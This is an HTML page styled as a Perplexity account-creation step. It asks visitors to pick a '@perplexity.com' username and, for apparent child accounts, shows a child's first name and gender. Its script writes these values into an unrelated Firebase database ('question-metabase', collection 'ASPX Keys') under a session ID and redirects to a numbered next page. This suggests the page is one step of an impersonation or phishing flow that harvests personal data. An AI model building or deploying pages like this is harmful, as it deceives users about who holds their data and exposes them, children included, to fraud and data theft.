<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perplexity - How you’ll sign in</title>
    <style>
        /* Base (Light Theme) Variables */
        :root {
            --bg-color: #ffffff;
            --text-primary: #000000;
            --text-secondary: #6e6e73;
            --input-bg: #ffffff;
            --input-border: #d1d1d6;
            --input-border-focus: #000000;
            --label-bg: #ffffff;
            --domain-text: #8e8e93;
            --btn-bg: #000000;
            --btn-text: #ffffff;
            --error-text: #d93025;
        }

        /* Real-time Dark Theme */
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000; /* Pure black as requested */
                --text-primary: #ffffff;
                --text-secondary: #a1a1a6;
                --input-bg: #000000; /* Pure black input box */
                --input-border: #444444;
                --input-border-focus: #ffffff;
                --label-bg: #000000;
                --domain-text: #6e6e73;
                --btn-bg: #ffffff;
                --btn-text: #000000;
                --error-text: #ff6b6b;
            }
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            margin: 0;
            padding: 40px 20px;
            background-color: var(--bg-color);
            color: var(--text-primary);
            transition: background-color 0.3s, color 0.3s; /* Smooth real-time transition */
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .sub-text {
            color: var(--text-secondary);
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 5px;
            text-align: left;
        }

        label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: var(--label-bg);
            padding: 0 4px;
            font-size: 12px;
            color: var(--text-secondary);
            z-index: 1;
            transition: background-color 0.3s, color 0.3s;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid var(--input-border);
            border-radius: 24px; /* Increased radius */
            padding: 12px 16px;
            height: 56px;
            box-sizing: border-box;
            background: var(--input-bg);
            transition: border-color 0.2s, background-color 0.3s;
        }

        .input-wrapper:focus-within {
            border-color: var(--input-border-focus);
            border-width: 2px;
        }

        input {
            border: none;
            outline: none;
            font-size: 17px;
            width: 100%;
            background: transparent;
            color: var(--text-primary);
        }

        .domain-suffix {
            color: var(--domain-text);
            font-size: 17px;
            margin-left: 4px;
            white-space: nowrap;
        }

        .instruction-text {
            font-size: 13px;
            color: var(--text-secondary);
            text-align: left;
            margin-top: 8px;
            margin-left: 10px;
        }

        .error-message {
            color: var(--error-text);
            font-size: 14px;
            margin-top: 8px;
            display: none;
            text-align: left;
            margin-left: 10px;
        }

        .next-btn {
            width: 100%;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 36px; /* Increased radius */
            padding: 16px;
            font-size: 18px;
            font-weight: 500;
            margin-top: 30px;
            cursor: pointer;
            transition: opacity 0.2s, background-color 0.3s, color 0.3s;
        }

        .next-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 id="mainHeading">How you’ll sign in</h1>
        <p id="subText" class="sub-text">Create a email address for signing in to your Perplexity Account</p>

        <div class="input-group">
            <label>Username</label>
            <div class="input-wrapper">
                <input type="text" id="usernameInput" placeholder="Username" autocomplete="off">
                <span class="domain-suffix">@perplexity.com</span>
            </div>
            <div id="instruction" class="instruction-text">You can use letters, numbers & periods</div>
            <div id="errorMsg" class="error-message">That username is taken. Try another.</div>
        </div>

        <button id="nextBtn" class="next-btn">Next</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        // Added getDoc to fetch user data for the dynamic text
        import { getFirestore, doc, getDoc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const usernameInput = document.getElementById('usernameInput');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');
        const instructionText = document.getElementById('instruction');
        const mainHeading = document.getElementById('mainHeading');
        const subText = document.getElementById('subText');

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const typeParam = urlParams.get('type'); 
        
        // Load user data on startup to configure UI (Kids Mode)
        async function initPageData() {
            if (!sessionId) return;
            
            try {
                const docRef = doc(db, "ASPX Keys", sessionId);
                const docSnap = await getDoc(docRef);
                
                if (docSnap.exists()) {
                    const data = docSnap.data();
                    const isKidsMode = typeParam === 'kids' || data.type === 'kids';

                    if (isKidsMode) {
                        const firstName = data.firstName || "User";
                        // Defaults to male if gender isn't found in DB or URL
                        const gender = (data.gender || urlParams.get('gender') || 'male').toLowerCase(); 
                        
                        const pronounSubject = gender === 'female' ? 'She' : 'He';
                        const pronounObject = gender === 'female' ? 'her' : 'his';

                        mainHeading.innerText = `Choose how ${firstName} will sign in`;
                        subText.innerText = `${pronounSubject} will use this email to sign in to ${pronounObject} Perplexity Account`;
                    }
                }
            } catch (error) {
                console.error("Failed to load user data:", error);
            }
        }
        initPageData();

        // Logic for handling the "Next" action
        async function handleNext() {
            const username = usernameInput.value.trim();
            if (!username) return;

            const fullEmail = username + "@perplexity.com";
            nextBtn.disabled = true;
            nextBtn.innerText = "Processing...";
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';

            try {
                // Check if username is taken
                const q = query(collection(db, "ASPX Keys"), where("email", "==", fullEmail));
                const querySnapshot = await getDocs(q);

                if (!querySnapshot.empty) {
                    errorMsg.style.display = 'block';
                    instructionText.style.display = 'none';
                    nextBtn.disabled = false;
                    nextBtn.innerText = "Next";
                } else {
                    // If available, update database and redirect
                    if (sessionId) {
                        const docRef = doc(db, "ASPX Keys", sessionId);
                        await updateDoc(docRef, {
                            email: fullEmail,
                            updatedAt: new Date().toLocaleString('en-US', { timeZone: 'UTC', hour12: true }) + " UTC+5:30"
                        });
                        
                        // Redirect to 4.html with the session ID & forward type parameter if it exists
                        let redirectUrl = `4.html?session=${sessionId}`;
                        if (typeParam) redirectUrl += `&type=${typeParam}`;
                        
                        window.location.href = redirectUrl;
                    } else {
                        alert("Error: Session ID missing.");
                        nextBtn.disabled = false;
                        nextBtn.innerText = "Next";
                    }
                }
            } catch (error) {
                console.error("Database Error:", error);
                nextBtn.disabled = false;
                nextBtn.innerText = "Next";
            }
        }

        // Restrict input characters strictly to (A-Z) (a-z) (0-9) and (.)
        usernameInput.addEventListener('input', (e) => {
            const val = e.target.value;
            // Removed toLowerCase() to allow Capital letters, stripped anything not a-z, A-Z, 0-9, or period
            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, ''); 
            
            if (val !== cleanVal) {
                usernameInput.value = cleanVal;
            }
            
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';
        });

        // Click event
        nextBtn.addEventListener('click', handleNext);

        // Enter key event
        usernameInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                handleNext();
            }
        });
    </script>
</body>
</html>
